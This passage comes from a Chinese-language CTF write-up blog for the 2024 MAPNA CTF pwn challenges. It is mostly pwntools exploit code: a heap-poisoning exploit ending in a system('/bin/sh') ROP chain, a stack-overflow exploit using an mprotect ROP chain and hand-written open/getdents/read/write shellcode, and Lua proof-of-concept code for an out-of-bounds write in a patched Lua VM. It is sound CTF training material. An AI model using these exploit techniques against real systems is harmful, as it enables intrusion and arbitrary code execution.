class=\"number\">3</span>)</span><br><span class=\"line\">delete(<span class=\"number\">3</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;Box content:\\n&#x27;</span>)</span><br><span class=\"line\">key = u64(r(<span class=\"number\">8</span>))</span><br><span class=\"line\">heap_base = key &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">0</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x1</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">1</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x1</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">select(<span class=\"number\">5</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">5</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">5</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">environ = libc_base + libc.sym[<span class=\"string\">&#x27;__environ&#x27;</span>]</span><br><span class=\"line\">ptr = heap_base + <span class=\"number\">0xaa0</span></span><br><span class=\"line\">edit(p64(ptr ^ key))</span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x1</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x1</span>, p64(<span class=\"number\">0x8</span>) + p64(environ))</span><br><span class=\"line\">show()</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;Box content:\\n&#x27;</span>)</span><br><span class=\"line\">stack = u64(r(<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0x1e</span>, <span class=\"number\">0x1e</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0x1e</span>, <span class=\"number\">0x1e</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">select(<span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(p64((stack - <span class=\"number\">0x148</span>) ^ key))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0x1e</span>, <span class=\"number\">0x1e</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x1965)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">rdi, ret = get_rdi_ret(libc_rop, libc_base)</span><br><span class=\"line\">system, binsh = get_sb()</span><br><span class=\"line\"></span><br><span class=\"line\">pl = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0</span>, <span class=\"number\">0x1e</span>, <span class=\"number\">0x1e</span>, pl)</span><br><span class=\"line\"></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;stack&#x27;</span>, stack)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;key&#x27;</span>, key)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">inter()</span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">pause()\t</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"protector-简单\"><a href=\"#protector-简单\" class=\"headerlink\" title=\"protector - 简单\"></a>protector - 简单</h2><p><img src=\"/2024/07/16/2024_mapna_CTF/0fa5160d65ef941ee7b0c2d8b382833b.png\" alt=\"0fa5160d65ef941ee7b0c2d8b382833b\"></p>\n<p>一个开启了沙箱的栈溢出程序，明显需要 orw ，但是其中的 generate_directory_tree.py 会将 flag 藏入随机生成的 0x100 个文件中的一个。</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/026aab2e2ea12ad1e327ec1349680936.png\" alt=\"026aab2e2ea12ad1e327ec1349680936\"></p>\n<p>出题人也留了 getdents 系统调用用来读取文件夹下的目录，可以用 mprotect ，直接用 shellcode 更加方便，直接让 gpt 写一个例子</p>\n<p>poc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;unistd.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;fcntl.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;sys/syscall.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;errno.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;stdint.h&gt;  // For uint64_t and int64_t</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#define BUF_SIZE 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\">typedef uint64_t u64;</span><br><span class=\"line\">typedef int64_t s64;</span><br><span class=\"line\"></span><br><span class=\"line\">struct mylkm_linux_dirent &#123;</span><br><span class=\"line\">    u64            d_ino;</span><br><span class=\"line\">    s64            d_off;</span><br><span class=\"line\">    unsigned short d_reclen;</span><br><span class=\"line\">    char           d_name[];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> main() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> fd;</span><br><span class=\"line\">    ssize_t nread;</span><br><span class=\"line\">    char buf[BUF_SIZE];</span><br><span class=\"line\"></span><br><span class=\"line\">    fd = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./maze&quot;</span>, O_RDONLY | O_DIRECTORY);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fd == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((nread = syscall(SYS_getdents, fd, (struct mylkm_linux_dirent *)buf, BUF_SIZE)) &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> bpos = <span class=\"number\">0</span>; bpos &lt; nread;) &#123;</span><br><span class=\"line\">            struct mylkm_linux_dirent *d = (struct mylkm_linux_dirent *)(buf + bpos);</span><br><span class=\"line\">            printf(<span class=\"string\">&quot;%s\\n&quot;</span>, d-&gt;d_name);</span><br><span class=\"line\">            bpos += d-&gt;d_reclen;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nread == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;getdents&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    close(fd);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里显然需要知道 d_name 和 d_reclen 的偏移是多少，才能搓汇编</p>\n<p>IDA 直接反汇编</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/a71807dfc724c70db8cd5776cb3e60b9.png\" alt=\"a71807dfc724c70db8cd5776cb3e60b9\"></p>\n<p>可以看到， bpos + 0x12 是文件名，bpos + 0x10 是下个文件结构体的基址，于是根据这个信息就可以手搓汇编了，先写出遍历所有文件的 shellcode，再补充 orw 进去。</p>\n<p>需要注意的是，getdents 要读 0x100 个文件的信息，所以我把信息保存到 libc_base + 0x21c000 中</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_rdi_ret</span>(<span class=\"params\">rop, base</span>) : <span class=\"keyword\">return</span> base + rop.find_gadget([<span class=\"string\">&#x27;pop rdi&#x27;</span>, <span class=\"string\">&#x27;ret&#x27;</span>]).address, base + rop.find_gadget([<span class=\"string\">&#x27;ret&#x27;</span>]).address</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>)<span class=\"comment\">#, log_level=&#x27;debug&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;47.238.36.100&#x27;, 9999)</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./chall&#x27;</span></span><br><span class=\"line\">p = process(elf_patch)</span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">elf_rop = ROP(elf_patch)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_patch = <span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(libc_patch):</span><br><span class=\"line\">\tlibc = ELF(libc_patch)</span><br><span class=\"line\">\tlibc_rop = ROP(libc_patch)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#ld = ELF(&#x27;./lib/ld-linux-x86-64.so.2&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *0x000000000040116c&#x27;)\t</span></span><br><span class=\"line\"></span><br><span class=\"line\">rdi_rsi_rdx = <span class=\"number\">0x00000000004014d9</span></span><br><span class=\"line\">ret = <span class=\"number\">0x000000000040101a</span></span><br><span class=\"line\">rbp = <span class=\"number\">0x00000000004011dd</span></span><br><span class=\"line\">leave = <span class=\"number\">0x000000000040148c</span></span><br><span class=\"line\"></span><br><span class=\"line\">buf = elf.bss() + <span class=\"number\">0x300</span></span><br><span class=\"line\"></span><br><span class=\"line\">pl = p64(buf) + p64(ret) + p64(rdi_rsi_rdx) + p64(elf.got[<span class=\"string\">&#x27;printf&#x27;</span>]) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(elf.sym[<span class=\"string\">&#x27;printf&#x27;</span>]) + p64(rdi_rsi_rdx) + p64(<span class=\"number\">0</span>) + p64(buf) + p64(<span class=\"number\">0x1000</span>) + p64(elf.sym[<span class=\"string\">&#x27;read&#x27;</span>]) + p64(leave)</span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Input: &#x27;</span>, <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span> + pl)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = u64(r(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)) - libc.sym[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">mprotect = libc_base + libc.sym[<span class=\"string\">&#x27;mprotect&#x27;</span>]</span><br><span class=\"line\">rax = libc_base + <span class=\"number\">0x0000000000045eb0</span></span><br><span class=\"line\">jmp_rax = <span class=\"number\">0x000000000040116c</span></span><br><span class=\"line\"></span><br><span class=\"line\">pl = p64(<span class=\"number\">0</span>) + p64(rdi_rsi_rdx) + p64(<span class=\"number\">0x404000</span>) + p64(<span class=\"number\">0x3000</span>) + p64(<span class=\"number\">7</span>) + p64(mprotect) + p64(rax) + p64(buf + <span class=\"number\">0x48</span>) + p64(jmp_rax)</span><br><span class=\"line\"></span><br><span class=\"line\">maze = libc_base + <span class=\"number\">0x21c000</span></span><br><span class=\"line\"></span><br><span class=\"line\">sc = shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./maze&#x27;</span>) + shellcraft.getdents(<span class=\"number\">3</span>, maze, <span class=\"number\">0x10000</span>)</span><br><span class=\"line\">sc += <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">mov rsp, r12;</span></span><br><span class=\"line\"><span class=\"string\">mov r10, rsi;</span></span><br><span class=\"line\"><span class=\"string\">xor r11, r11;</span></span><br><span class=\"line\"><span class=\"string\">mov [rsp], r11;</span></span><br><span class=\"line\"><span class=\"string\">mov r9, 0x2f657a616d2f2e00;</span></span><br><span class=\"line\"><span class=\"string\">orw:</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdi, r10;</span></span><br><span class=\"line\"><span class=\"string\">\tadd rdi, [rsp];</span></span><br><span class=\"line\"><span class=\"string\">\tadd rdi, 0x12;</span></span><br><span class=\"line\"><span class=\"string\">\tmov r8, rdi;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tsub rdi, 2;</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdi, [rdi];\t</span></span><br><span class=\"line\"><span class=\"string\">\tand rdi, 0xffff;</span></span><br><span class=\"line\"><span class=\"string\">\tadd [rsp], rdi;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdi, r8;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tsub rdi, 8;</span></span><br><span class=\"line\"><span class=\"string\">\tmov [rdi], r9;</span></span><br><span class=\"line\"><span class=\"string\">\tadd rdi, 1;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tmov eax, 2;</span></span><br><span class=\"line\"><span class=\"string\">\txor rsi, rsi;</span></span><br><span class=\"line\"><span class=\"string\">\txor rdx, rdx;</span></span><br><span class=\"line\"><span class=\"string\">\tsyscall</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tpush rax;</span></span><br><span class=\"line\"><span class=\"string\">\tpop rdi;</span></span><br><span class=\"line\"><span class=\"string\">\tmov rsi, 0x404090;</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdx, 0x50;</span></span><br><span class=\"line\"><span class=\"string\">\tmov eax, 0;</span></span><br><span class=\"line\"><span class=\"string\">\tsyscall;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdi, 1;</span></span><br><span class=\"line\"><span class=\"string\">\tmov rax, 1;</span></span><br><span class=\"line\"><span class=\"string\">\tsyscall;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tjmp orw;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">pl += asm(sc)</span><br><span class=\"line\"></span><br><span class=\"line\">s(pl)</span><br><span class=\"line\"></span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;MAPNA&#x27;</span>)</span><br><span class=\"line\">pr()</span><br><span class=\"line\">pause()\t</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"u2s-偏难\"><a href=\"#u2s-偏难\" class=\"headerlink\" title=\"u2s 偏难\"></a>u2s 偏难</h2><p>这道题偏难的原因是该题是一个 c 语言实现的 lua 虚拟机，如果不熟悉 lua 语言会比较难做。</p>\n<p>题目给了 diff 文件，其中重点关注的是</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff <span class=\"comment\">--git a/src/lvm.h b/src/lvm.h</span></span><br><span class=\"line\">index dba1ad2.<span class=\"number\">.485</span>b5aa <span class=\"number\">100644</span></span><br><span class=\"line\"><span class=\"comment\">--- a/src/lvm.h</span></span><br><span class=\"line\">+++ b/src/lvm.h</span><br><span class=\"line\">@@ <span class=\"number\">-96</span>,<span class=\"number\">7</span> +<span class=\"number\">96</span>,<span class=\"number\">7</span> @@ typedef enum &#123;</span><br><span class=\"line\"> #define luaV_fastgeti(L,t,k,slot) \\</span><br><span class=\"line\">   (!ttistable(t)  \\</span><br><span class=\"line\">    ? (slot = NULL, <span class=\"number\">0</span>)  /* <span class=\"keyword\">not</span> a <span class=\"built_in\">table</span>; <span class=\"string\">&#x27;slot&#x27;</span> is NULL <span class=\"keyword\">and</span> result is <span class=\"number\">0</span> */  \\</span><br><span class=\"line\">-   : (slot = (l_castS2U(k) - <span class=\"number\">1</span>u &lt; hvalue(t)-&gt;alimit) \\</span><br><span class=\"line\">+   : (slot = (l_castU2S(k) - <span class=\"number\">1</span>u &lt; hvalue(t)-&gt;alimit) \\</span><br><span class=\"line\">               ? &amp;hvalue(t)-&gt;array[k - <span class=\"number\">1</span>] : luaH_getint(hvalue(t), k), \\</span><br><span class=\"line\">       !isempty(slot)))  /* result <span class=\"keyword\">not</span> empty? */</span><br></pre></td></tr></table></figure>\n\n<p>luaV_fastgeti 定义在查阅资料后发现是用于获取 Lua 表（table）中整数键（integer keys）对应的值，那么说明这个 patch 会导致 oob，还有其它 patch 是限制了读文件、命令执行等，就不详细说。</p>\n<p>一开始做这个题目，想着用下面的 poc</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">local</span> ptr_a = &#123;<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> ,<span class=\"number\">4</span> ,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ptr_a[<span class=\"number\">-1</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ptr_a[<span class=\"number\">7</span>])</span><br></pre></td></tr></table></figure>\n\n<p>结果读出来的都是 nil，就比较怀疑是不是 oob 了</p>\n<p>接着测试下面的 poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local ptr_a = &#123;&quot;stopstop&quot;, 2, 3 ,4 ,5&#125;</span><br><span class=\"line\">print(ptr_a[1])</span><br></pre></td></tr></table></figure>\n\n<p>通过打断点到 write </p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/325cb2be0d46af5dfa4e554f694f5653.png\" alt=\"325cb2be0d46af5dfa4e554f694f5653\"></p>\n<p>可以直接跑到 print 函数的底层 write 处，通过栈回溯</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/2995cb6424e5ad1909e50a60c5d2d3fb.png\" alt=\"2995cb6424e5ad1909e50a60c5d2d3fb\"></p>\n<p>可以判断出 luaB_print 是用来输出数组元素的</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/412ba4989eb7b2d59e91b7902ee90dc0.png\" alt=\"412ba4989eb7b2d59e91b7902ee90dc0\"></p>\n<p>其中的 luaL_tolstring 函数就是用来在列表中找值的，不过直接调试，发现 luaL_tolstring  是没有越界的。</p>\n<p>接着测试和数组相关的代码，继续调试的话，会发现</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">local</span> ptr_a = &#123;<span class=\"number\">0x11223344</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> ,<span class=\"number\">4</span> ,<span class=\"number\">5</span>, <span class=\"number\">6</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ptr_a[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_a[<span class=\"number\">-5</span>] = <span class=\"number\">0xaabbccdd</span></span><br></pre></td></tr></table></figure>\n\n<p>上面的 poc 存在负向溢出写</p>\n<p>调试 gdb 配置如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set args ./poc</span><br><span class=\"line\">start</span><br><span class=\"line\">b 